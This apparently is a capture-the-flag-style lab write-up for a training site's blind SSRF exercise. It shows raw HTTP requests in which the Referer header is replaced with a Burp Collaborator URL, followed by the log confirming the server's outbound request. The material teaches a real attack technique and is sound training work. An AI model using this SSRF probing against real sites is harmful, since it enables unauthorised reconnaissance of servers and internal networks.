## Blind SSRF with out-of-band detection

This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server.

Note :

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

## Notes

-

## Resume

1. Capture any product request
2. Update the **Referer** header with Burp Collaborator url
3. Send the request

## Solve 

Capture a product request : 

```
GET /product?productId=1 HTTP/2
Host: 0a1f004303bd2c248088710100590036.web-security-academy.net
Cookie: session=oHDrQQMLvfhZKi4fe0nNvQLgGLiVzHoY
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a1f004303bd2c248088710100590036.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

Update the **Referer** header with the **Collaborator** url and resend it :

```
GET /product?productId=1 HTTP/2
Host: 0a1f004303bd2c248088710100590036.web-security-academy.net
Cookie: session=oHDrQQMLvfhZKi4fe0nNvQLgGLiVzHoY
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://n8wobdfwgxixd7oz1o97x5k9l0rrfh36.oastify.com
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

Check the **Collaborator** to see the DNS/HTTP request on it :

```
The Collaborator server received an HTTP request.  The request was received from IP address 34.251.122.40:33992 at 2026-Apr-17 14:45:40.807 UTC.
```